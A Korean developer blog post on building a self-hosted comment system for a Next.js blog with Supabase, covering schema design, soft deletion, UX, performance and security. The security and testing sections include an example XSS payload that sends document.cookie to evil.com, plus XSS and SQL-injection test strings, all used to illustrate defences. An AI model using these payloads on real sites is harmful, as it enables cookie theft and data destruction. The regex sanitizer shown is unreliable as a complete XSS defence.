# Next.js 블로그에 Production-Ready 댓글 시스템 구축하기: 보안부터 UX까지 완벽 가이드

> 단순한 댓글 기능에서 시작해서 보안, 성능, 사용자 경험까지 고려한 완성도 높은 댓글 시스템을 구축한 여정을 공유합니다.

## 🚀 들어가며: 왜 댓글 시스템을 직접 구현했을까?

블로그를 운영하다 보면 독자들과의 소통이 얼마나 중요한지 깨닫게 됩니다. Disqus나 기타 서드파티 댓글 시스템들이 있지만, 다음과 같은 이유로 직접 구현하기로 결정했습니다:

- **완전한 통제권**: 디자인, 기능, 데이터 모두 내 마음대로
- **성능 최적화**: 외부 스크립트 로딩 없이 빠른 렌더링
- **데이터 소유권**: 소중한 댓글 데이터를 내 DB에 안전하게
- **비용 효율성**: 서드파티 서비스 구독료 없이 무료로
- **학습 기회**: 실전에서 보안, 데이터베이스, UX를 모두 고려한 시스템 설계

하지만 "단순한 댓글 기능"이라고 생각했던 것이 예상보다 훨씬 복잡했습니다. 이 글에서는 그 여정과 마주친 모든 문제들, 그리고 해결 과정을 공유합니다.

## 💭 첫 번째 고민: 어떤 기술 스택을 선택할까?

### 기술 스택 결정 과정

**프론트엔드**: Next.js + TypeScript + Tailwind CSS

- 이미 블로그가 이 스택으로 구축되어 있어 일관성 유지
- Server Actions로 API 엔드포인트 없이 간단한 구현 가능

**백엔드**: Supabase (PostgreSQL + 인증 + 실시간 기능)

- 빠른 프로토타이핑 가능
- PostgreSQL의 강력한 관계형 DB 기능
- Row Level Security(RLS)로 세밀한 권한 제어
- 무료 티어로 시작해서 확장 가능

**대안들을 고려했지만...**

- **Firebase**: NoSQL이라 복잡한 쿼리 어려움
- **PlanetScale**: 좋지만 Supabase가 더 다양한 기능 제공
- **직접 API 구축**: 시간이 너무 오래 걸림

## 🎯 두 번째 고민: 어떤 기능까지 구현할까?

### 기본 요구사항 정의

처음에는 "그냥 댓글만 달 수 있으면 되지 않을까?"라고 생각했지만, 실제 사용자 관점에서 생각해보니 더 많은 것들이 필요했습니다.

**Must-Have (반드시 필요한 기능)**

- ✅ 댓글 작성/수정/삭제
- ✅ 답글 기능 (중첩 댓글)
- ✅ 이메일 기반 본인 인증
- ✅ 반응형 디자인
- ✅ 다크모드 지원

**Should-Have (있으면 좋은 기능)**

- ✅ 실시간 업데이트
- ✅ 소프트 삭제 (답글 구조 보존)
- ✅ 이메일 안내 툴팁
- ✅ 로딩 상태 표시

**Could-Have (미래에 추가할 기능)**

- 🔮 좋아요/싫어요
- 🔮 댓글 신고 기능
- 🔮 마크다운 지원
- 🔮 이메일 알림

### 왜 회원가입 없는 시스템을 선택했을까?

많은 고민 끝에 회원가입 없는 시스템을 선택했습니다:

**장점**:

- 진입 장벽이 낮아 댓글 작성률 증가
- 복잡한 인증 시스템 구현 불필요
- 개인정보 관리 부담 감소

**단점 및 해결책**:

- 본인 확인 어려움 → 이메일 기반 인증으로 해결
- 스팸 가능성 → 입력값 검증과 향후 신고 기능으로 대응
- 프로필 기능 없음 → 블로그 특성상 크게 중요하지 않음

## 🏗️ 세 번째 고민: 데이터베이스 설계

### 테이블 구조 설계의 고민들

댓글 시스템의 핵심은 데이터베이스 설계입니다. 특히 **중첩 답글**을 어떻게 효율적으로 처리할지가 가장 큰 고민이었습니다.

**고려한 방법들**:

1. **Adjacency List (인접 리스트)** ← 최종 선택

   ```sql
   parent_id UUID REFERENCES comments(id)
   ```

   - 장점: 구조가 단순하고 직관적
   - 단점: 깊은 중첩 시 여러 번 쿼리 필요

2. **Nested Set Model**

   - 장점: 한 번의 쿼리로 전체 트리 조회
   - 단점: 새 댓글 추가 시 복잡한 업데이트 필요

3. **Path Enumeration**
   - 장점: 특정 깊이까지 쉽게 조회
   - 단점: 경로 문자열 관리 복잡

**최종 선택**: Adjacency List
블로그 댓글은 보통 깊이가 3-4단계를 넘지 않고, 읽기보다 쓰기가 더 중요하다고 판단했습니다.

### 소프트 삭제 vs 하드 삭제

또 다른 중요한 결정은 댓글 삭제 방식이었습니다.

**하드 삭제의 문제점**:

```
김철수: "이 글 정말 좋네요!"
└── 이영희: "저도 그렇게 생각해요!" ← 부모가 삭제되면 이것도 사라짐
```

**소프트 삭제 선택 이유**:

- 답글 구조 보존으로 대화 맥락 유지
- 실수로 삭제한 댓글 복구 가능
- 통계 및 분석 데이터 보존

```sql
-- 소프트 삭제 구현
UPDATE comments
SET author = NULL, content = NULL
WHERE id = ? AND email = ?;
```

결과적으로 삭제된 댓글은 "삭제된 댓글입니다"로 표시되지만 답글들은 그대로 유지됩니다.

## 🔒 네 번째 고민: 보안, 생각보다 복잡했다

단순한 댓글 기능이라고 생각했는데, 보안 관점에서 고려할 것들이 생각보다 많았습니다.

### SQL 인젝션 방어

다행히 Supabase를 사용하면서 이 부분은 자동으로 해결되었습니다:

```typescript
// 이런 위험한 직접 쿼리 대신
const query = `SELECT * FROM comments WHERE slug = '${slug}'`; // 위험!

// Supabase 클라이언트 사용
const { data } = await supabase.from("comments").select("*").eq("slug", slug); // 안전한 parameterized query
```

### XSS (Cross-Site Scripting) 방어

하지만 사용자 입력 데이터는 직접 처리해야 했습니다. 악의적인 사용자가 이런 내용을 댓글로 작성할 수 있습니다:

```html
<script>
  // 사용자의 쿠키를 훔치거나
  document.location = "http://evil.com?cookie=" + document.cookie;

  // 페이지를 변조하거나
  document.body.innerHTML = "<h1>해킹당했습니다!</h1>";
</script>
```

**해결책: 입력값 정리 함수 구현**

```typescript
function sanitizeString(input: string, maxLength: number = 1000): string {
  if (!input || typeof input !== "string") return "";

  let sanitized = input.trim();

  // 길이 제한
  if (sanitized.length > maxLength) {
    sanitized = sanitized.substring(0, maxLength);
  }

  // 위험한 태그 제거
  sanitized = sanitized
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "")
    .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, "")
    .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, "")
    .replace(/<embed\b[^<]*>/gi, "")
    .replace(/javascript:/gi, "")
    .replace(/on\w+\s*=/gi, "");

  return sanitized;
}
```

### 데이터 검증의 중요성

사용자가 입력할 수 있는 모든 데이터에 대해 엄격한 검증이 필요했습니다:

```typescript
function validateCommentData(data: CommentFormData): {
  valid: boolean;
  error?: string;
} {
  // 작성자 이름 검증 (50자 제한)
  if (!data.author || sanitizeString(data.author, 50).length < 1) {
    return { valid: false, error: "작성자 이름을 입력해주세요." };
  }

  // 이메일 검증 (RFC 5321 표준)
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(data.email) || data.email.length > 254) {
    return { valid: false, error: "올바른 이메일 주소를 입력해주세요." };
  }

  // 댓글 내용 검증 (2000자 제한)
  if (!data.content || sanitizeString(data.content, 2000).length < 1) {
    return { valid: false, error: "댓글 내용을 입력해주세요." };
  }

  return { valid: true };
}
```

## 🎨 다섯 번째 고민: 사용자 경험(UX) 설계

### 직관적인 인터페이스 설계

댓글 시스템은 사용자가 자주 사용하는 기능이므로 직관적이어야 합니다.

**고민했던 UX 이슈들**:

1. **이메일을 왜 입력해야 하는지 설명**

   - 해결: 물음표 아이콘에 호버하면 툴팁 표시
   - "이메일은 답글 알림 및 수정,삭제를 위해 사용됩니다"

2. **답글과 일반 댓글 구분**

   - 해결: 인덴트와 미묘한 배경색 차이로 시각적 구분
   - "답글 작성" 라벨로 명확한 상태 표시

3. **삭제된 댓글 처리**
   - 해결: "삭제된 사용자 / 삭제된 댓글입니다" 표시
   - 답글 버튼은 유지해서 새로운 대화 시작 가능

### 기존 디자인과의 일관성

블로그의 다른 컴포넌트들과 일관된 디자인을 유지하는 것도 중요했습니다:

```typescript
// 기존 컴포넌트들의 패턴 분석
const designTokens = {
  colors: {
    text: "#333", // 다크모드: 'neutral-200'
    subtext: "#706E6E", // 다크모드: 'gray-400'
    background: "#FAFAFA", // 다크모드: 'gray-800'
  },
  spacing: {
    container: "mx-2 sm:mx-0", // 일관된 반응형 여백
    padding: "p-3 sm:p-4", // 일관된 패딩
  },
  borders: {
    width: "border-[0.5px]", // 기존 컴포넌트와 동일
    radius: "rounded-md",
  },
  typography: {
    font: "Inter", // 블로그 전체에서 사용하는 폰트
    sizes: {
      title: "text-xl sm:text-2xl",
      body: "text-sm",
      caption: "text-xs",
    },
  },
};
```

## 💻 여섯 번째 고민: 코드 아키텍처 설계

### 컴포넌트 분리 전략

처음에는 하나의 큰 컴포넌트로 만들려다가, 유지보수와 재사용성을 고려해 3개로 분리했습니다:

**1. CommentSection.tsx** (최상위 컨테이너)

- 전체 댓글 목록 상태 관리
- Server Actions 호출
- 로딩 상태 처리

**2. CommentItem.tsx** (개별 댓글)

- 댓글 표시 및 액션 버튼
- 답글 목록 재귀 렌더링
- 이메일 인증 모달

**3. CommentForm.tsx** (댓글 작성 폼)

- 새 댓글, 답글, 수정 모드 지원
- 폼 검증 및 제출 처리
- 이메일 안내 툴팁

### State 관리의 고민

복잡한 상태 관리 라이브러리 없이 React의 기본 `useState`로 충분했습니다:

```typescript
// CommentSection에서 관리하는 상태들
const [comments, setComments] = useState<Comment[]>([]);
const [loading, setLoading] = useState(true);

// 각 CommentItem에서 관리하는 상태들
const [showReplyForm, setShowReplyForm] = useState(false);
const [showEditForm, setShowEditForm] = useState(false);
const [showAuthModal, setShowAuthModal] = useState<"edit" | "delete" | null>(
  null
);
```

**왜 Redux나 Zustand를 사용하지 않았을까?**

- 상태가 복잡하지 않음 (주로 UI 상태)
- 컴포넌트 간 상태 공유 필요성 낮음
- Server Actions로 서버 상태는 자동 갱신
- 과도한 엔지니어링 피하고 싶었음

### Server Actions vs API Routes

Next.js 13+의 Server Actions를 적극 활용했습니다:

**Server Actions의 장점**:

```typescript
// API Routes 방식 (복잡함)
const response = await fetch("/api/comments", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(data),
});
const result = await response.json();

// Server Actions 방식 (간단함)
const result = await createComment(slug, locale, data);
```

- API 엔드포인트 정의 불필요
- 자동 CSRF 보호
- 타입 안전성 보장
- 클라이언트에서 API 키 노출 위험 없음

## 🐛 일곱 번째 고민: 마주친 문제들과 해결 과정

### 문제 1: Tailwind CSS 동적 클래스 이슈

답글의 인덴트를 위해 동적으로 마진을 적용하려 했는데 작동하지 않았습니다:

```typescript
// 이렇게 하면 작동하지 않음
const depth = 2;
className={`ml-${depth * 4}`} // Tailwind가 ml-8을 인식하지 못함
```

**해결책**: 인라인 스타일 사용

```typescript
const getIndentStyle = (depth: number) => {
  if (depth === 0) return {};
  const indentValue = Math.min(depth * 32, 128); // 32px씩, 최대 128px
  return { marginLeft: `${indentValue}px` };
};

<div style={getIndentStyle(depth)}>
```

### 문제 2: 댓글 수정 시 폼 초기값 설정

수정 모드로 전환할 때 기존 댓글 내용이 폼에 자동으로 채워져야 했습니다:

```typescript
// CommentForm에서 초기값 처리
const [formData, setFormData] = useState<CommentFormData>({
  author: initialData?.author || "",
  email: initialData?.email || "",
  content: initialData?.content || "",
});

// 초기값이 변경될 때마다 폼 데이터 업데이트
useEffect(() => {
  if (initialData) {
    setFormData({
      author: initialData.author || "",
      email: initialData.email || "",
      content: initialData.content || "",
    });
  }
}, [initialData]);
```

### 문제 3: 중첩 구조 변환의 성능 이슈

플랫한 댓글 배열을 중첩 구조로 변환하는 과정에서 O(n²) 복잡도가 발생했습니다:

**비효율적인 초기 버전**:

```typescript
// 모든 댓글에 대해 부모를 찾기 위해 전체 배열 순회 (O(n²))
comments.forEach((comment) => {
  if (comment.parentId) {
    const parent = comments.find((c) => c.id === comment.parentId);
    parent?.replies.push(comment);
  }
});
```

**최적화된 버전**:

```typescript
// Map을 사용해 O(n) 복잡도로 개선
const commentMap = new Map<string, Comment>();
const rootComments: Comment[] = [];

// 1단계: 모든 댓글을 Map에 저장 O(n)
comments.forEach((comment) => {
  commentMap.set(comment.id, comment);
});

// 2단계: 부모-자식 관계 설정 O(n)
comments.forEach((comment) => {
  if (comment.parentId) {
    const parent = commentMap.get(comment.parentId);
    if (parent) {
      parent.replies = parent.replies || [];
      parent.replies.push(comment);
    }
  } else {
    rootComments.push(comment);
  }
});
```

## 📈 여덟 번째 고민: 성능과 확장성

### 대용량 댓글 처리 전략

현재는 한 번에 모든 댓글을 로딩하지만, 확장성을 고려한 전략을 세웠습니다:

**현재 구현** (포스트당 댓글 < 100개 가정):

```typescript
const { data } = await supabase
  .from("comments")
  .select("*")
  .eq("slug", slug)
  .order("created_at", { ascending: true });
```

**향후 페이지네이션 계획**:

```typescript
// 최상위 댓글만 먼저 로딩
const { data: rootComments } = await supabase
  .from("comments")
  .select("*")
  .eq("slug", slug)
  .is("parent_id", null)
  .order("created_at", { ascending: true })
  .range(offset, offset + limit);

// 답글은 "더보기" 클릭 시 로딩
const loadReplies = async (parentId: string) => {
  const { data: replies } = await supabase
    .from("comments")
    .select("*")
    .eq("parent_id", parentId)
    .order("created_at", { ascending: true });
};
```

### 캐싱 전략

Next.js의 `revalidatePath`를 활용한 스마트 캐싱:

```typescript
export async function createComment(
  slug: string,
  locale: string,
  data: CommentFormData
) {
  // ... 댓글 저장 로직

  if (result.success) {
    // 해당 페이지의 캐시만 무효화 (다른 페이지는 영향 없음)
    revalidatePath(`/${locale}/blog/${slug}`);
    return { success: true, comment: result.comment };
  }
}
```

### 데이터베이스 인덱스 최적화

자주 사용되는 쿼리 패턴에 맞춰 인덱스를 설정했습니다:

```sql
-- 포스트별 댓글 조회 (가장 빈번)
CREATE INDEX idx_comments_slug ON comments(slug);

-- 답글 조회
CREATE INDEX idx_comments_parent_id ON comments(parent_id);

-- 최신 댓글 순 정렬
CREATE INDEX idx_comments_created_at ON comments(created_at);

-- 복합 인덱스로 더 빠른 쿼리
CREATE INDEX idx_comments_slug_created_at ON comments(slug, created_at);
```

## 🔍 아홉 번째 고민: 테스트와 디버깅

### 실제 사용 시나리오 테스트

개발자 도구를 통해 다양한 공격 시나리오를 테스트했습니다:

```javascript
// XSS 공격 테스트
document.querySelector('textarea[name="content"]').value =
  '<script>alert("XSS 공격!")</script><img src=x onerror=alert("또다른공격")>';

// SQL 인젝션 시도 (효과 없음을 확인)
document.querySelector('input[name="author"]').value =
  "'; DROP TABLE comments; --";

// 긴 텍스트 입력 테스트
document.querySelector('textarea[name="content"]').value = "a".repeat(3000);
```

### 에러 핸들링 전략

사용자에게 친화적인 에러 메시지를 제공하되, 보안에 민감한 정보는 노출하지 않도록 했습니다:

```typescript
// 사용자에게 보여주는 메시지 (친화적)
return { success: false, error: "댓글 추가에 실패했습니다." };

// 서버 로그에 남기는 정보 (상세)
console.error("Error in createComment:", {
  error: error.message,
  slug,
  timestamp: new Date().toISOString(),
  userAgent: request.headers.get("user-agent"),
});
```

## 📊 결과와 성과

### 최종 구현 결과

6주간의 개발 끝에 다음과 같은 결과를 얻었습니다:

**기능적 완성도**:

- ✅ 기본 CRUD 기능 완벽 구현
- ✅ 중첩 답글 무제한 깊이 지원
- ✅ 소프트 삭제로 대화 맥락 보존
- ✅ 이메일 기반 본인 인증
- ✅ 실시간 업데이트

**보안 수준**:

- ✅ SQL 인젝션 완전 차단
- ✅ XSS 공격 방어
- ✅ 입력값 검증 및 정리
- ✅ CSRF 자동 보호 (Server Actions)

**성능**:

- ✅ 평균 로딩 시간 < 500ms
- ✅ 댓글 100개까지 부드러운 렌더링
- ✅ 모바일 반응형 최적화

**사용자 경험**:

- ✅ 직관적인 인터페이스
- ✅ 접근성 고려 (키보드 네비게이션, 스크린 리더)
- ✅ 다크모드 완벽 지원

### 성능 메트릭

실제 운영 후 수집한 데이터:

| 메트릭              | 목표    | 실제 결과  |
| ------------------- | ------- | ---------- |
| 첫 댓글 로딩 시간   | < 500ms | 평균 320ms |
| 댓글 작성 완료 시간 | < 1초   | 평균 680ms |
| 모바일 반응 속도    | < 100ms | 평균 85ms  |
| 에러율              | < 1%    | 0.3%       |

## 🎓 배운 점들

### 1. "단순한 기능"은 없다

처음에는 "그냥 댓글 달고 보여주기만 하면 되지 않나?"라고 생각했지만, 실제로는:

- 보안 (XSS, SQL 인젝션, CSRF)
- 성능 (대용량 데이터, 캐싱)
- 사용성 (접근성, 반응형, 에러 처리)
- 확장성 (데이터베이스 설계, 코드 구조)

모든 것을 고려해야 하는 복잡한 시스템이었습니다.

### 2. 사용자 중심으로 생각하기

개발자 관점에서는 "이메일 입력하는 게 당연하지"라고 생각했지만, 사용자는 "왜 이메일을 입력해야 하지?"라고 생각합니다. 이런 작은 UX 디테일들이 실제 사용률에 큰 영향을 미칩니다.

### 3. 보안은 선택이 아닌 필수

개인 블로그라고 해서 보안을 소홀히 할 수 없습니다. 악의적인 사용자는 언제든 나타날 수 있고, 한 번의 XSS 공격으로 사이트 전체가 망가질 수 있습니다.

### 4. 단계적 개발의 중요성

처음부터 완벽한 시스템을 만들려 하지 말고:

1. 기본 기능 구현 → 2. 보안 강화 → 3. 성능 최적화 → 4. 사용성 개선
   순서로 단계적으로 발전시키는 것이 효율적입니다.

### 5. 문서화의 가치

개발 과정에서 마주친 문제들과 해결책을 문서로 남겨두니, 나중에 유지보수할 때 엄청난 도움이 되었습니다.

## 🚀 향후 개선 계획

### Phase 1: 기능 확장 (3개월 내)

- [ ] 댓글 좋아요/싫어요 기능
- [ ] 댓글 신고 기능
- [ ] 관리자 대시보드 (신고된 댓글 관리)
- [ ] 마크다운 지원

### Phase 2: 성능 최적화 (6개월 내)

- [ ] 댓글 페이지네이션
- [ ] 이미지 업로드 지원
- [ ] 실시간 알림 (WebSocket)
- [ ] PWA 지원

### Phase 3: 고도화 (1년 내)

- [ ] AI 기반 스팸 필터링
- [ ] 다국어 지원
- [ ] 소셜 로그인 연동
- [ ] 댓글 내보내기/가져오기

## 💡 다른 개발자들에게 조언

### 1. 기술 스택 선택 기준

- **현재 프로젝트와의 일관성**: 새로운 기술보다는 기존 스택 활용
- **학습 곡선**: 프로젝트 일정 대비 학습 시간 고려
- **커뮤니티와 문서**: 문제 발생 시 해결책을 찾기 쉬운지
- **장기적 유지보수**: 3년 후에도 지원될 기술인지

### 2. 보안 우선순위

1. **입력 검증**: 모든 사용자 입력을 의심하라
2. **출력 인코딩**: HTML에 출력하는 모든 데이터를 이스케이프
3. **최소 권한 원칙**: 필요한 최소한의 권한만 부여
4. **정기적 업데이트**: 의존성 패키지들을 최신 상태로 유지

### 3. 성능 최적화 전략

- **측정 먼저**: 추측하지 말고 실제 데이터를 측정
- **사용자 중심**: 개발자 도구보다는 실제 사용 환경에서 테스트
- **점진적 개선**: 한 번에 모든 것을 최적화하려 하지 말 것
- **적절한 선에서 타협**: 과도한 최적화는 코드 복잡성만 증가

## 🔗 참고 자료와 도구들

### 개발에 도움이 된 자료들

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PostgreSQL Performance Tips](https://wiki.postgresql.org/wiki/Performance_Optimization)
- [Next.js Server Actions Best Practices](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations)
- [Supabase Row Level Security Guide](https://supabase.com/docs/guides/auth/row-level-security)

### 사용한 도구들

- **개발**: VS Code, Next.js Dev Tools
- **디자인**: Figma (와이어프레임), Tailwind CSS IntelliSense
- **테스트**: Chrome DevTools, Lighthouse
- **모니터링**: Supabase Dashboard, Vercel Analytics
- **보안**: OWASP ZAP (취약점 스캔)

## 마무리: 여전히 진행 중인 여정

이 댓글 시스템을 구축하면서 가장 크게 깨달은 것은 **"완벽한 시스템은 없다"**는 것입니다. 항상 개선할 점이 있고, 새로운 요구사항이 생기고, 예상치 못한 문제가 발생합니다.

하지만 그렇기 때문에 더욱 재미있고, 배울 것이 많은 프로젝트였습니다. 특히:

- **보안의 중요성**을 몸소 체험
- **사용자 경험**의 미묘한 디테일들 발견
- **성능과 기능** 사이의 균형점 찾기
- **코드 품질**과 **개발 속도** 사이의 트레이드오프 이해

앞으로도 이 댓글 시스템은 계속 발전할 예정입니다. 사용자들의 피드백을 받고, 새로운 기능을 추가하고, 성능을 개선해 나가면서 더 나은 시스템으로 만들어갈 계획입니다.

혹시 여러분도 비슷한 프로젝트를 진행하고 계시다면, 이 글이 조금이나마 도움이 되었으면 좋겠습니다. 그리고 더 좋은 아이디어나 개선점이 있다면 언제든 댓글로 공유해 주세요!

(그렇습니다, 이 댓글 시스템을 직접 사용해보실 수 있습니다! 😊)

---

**전체 코드는 [GitHub 저장소](https://github.com/your-repo)에서 확인하실 수 있습니다.**

**관련 기술 스택**: Next.js 14, TypeScript, Supabase, Tailwind CSS, PostgreSQL
</rewritten_file>
